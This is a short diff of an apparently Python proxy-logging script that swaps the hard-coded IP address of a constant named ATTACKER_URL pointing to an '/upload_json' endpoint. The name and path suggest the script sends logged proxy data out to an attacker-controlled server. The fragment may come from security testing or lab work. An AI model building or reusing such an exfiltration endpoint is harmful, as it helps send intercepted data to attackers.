@@ -16,7 +16,7 @@ LOG_DIR = BASE_DIR / "logs"
 LOG_DIR.mkdir(exist_ok=True)
 
 PROXY_LOG = LOG_DIR / "proxy.csv"
-ATTACKER_URL = "https://52.23.81.119:443/upload_json"
+ATTACKER_URL = "https://54.159.242.217:443/upload_json"
 
 # CSVヘッダ初期化
 if not PROXY_LOG.exists():
